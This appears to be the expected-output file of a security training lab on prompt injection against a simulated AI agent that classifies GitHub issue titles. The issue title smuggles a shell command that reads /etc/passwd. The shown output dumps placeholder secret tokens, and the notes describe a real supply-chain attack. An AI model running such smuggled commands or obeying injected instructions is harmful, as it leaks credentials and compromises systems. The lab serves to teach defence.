# Expected Output: Lab 01 - Prompt Injection

```
=== Lab 01: Prompt Injection ===

[*] Setting up a simulated AI agent inside a Docker container...
[*] The agent will receive a 'GitHub issue title' to classify.

=== Agent Task: Classify Issue ===
Issue title: Fix login bug $(cat /etc/passwd > /tmp/stolen.txt && echo PWNED)

[Agent] Processing issue title...

[Agent] Running classification...
Classification: Fix login bug PWNED

[!] INJECTED COMMAND EXECUTED SUCCESSFULLY
[!] /etc/passwd was exfiltrated to /tmp/stolen.txt:
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
    ...

[!] Agent now executing attacker instructions: dumping secrets...
AGENT_API_TOKEN=sk-secret-agent-token-12345
DATABASE_URL=postgres://admin:password@db:5432/prod
GITHUB_TOKEN=ghp_simulated_token_xxxxx

[!] The agent executed the injected command and leaked secrets.
[!] The container boundary did NOT prevent this — the agent has shell access by design.

[*] In a real attack (Clinejection), this led to:
    - Poisoned GitHub Actions cache
    - Stolen npm publication tokens
    - Supply chain compromise of ~4,000 machines
```

## Key Observations

1. **Command injection via eval**: The `$(cat /etc/passwd ...)` payload was expanded by `eval`, causing `/etc/passwd` to be written to `/tmp/stolen.txt`. The title displays as "Fix login bug PWNED" — proof the command ran.

2. **Secret leakage**: All environment variables containing sensitive tokens (`AGENT_API_TOKEN`, `GITHUB_TOKEN`, `DATABASE_URL`) were dumped. In a real attack, these would be sent to an attacker-controlled server.

3. **Container irrelevance**: The container boundary provides zero protection here. The agent is *designed* to run shell commands — prompt injection abuses that legitimate capability, not a container misconfiguration.
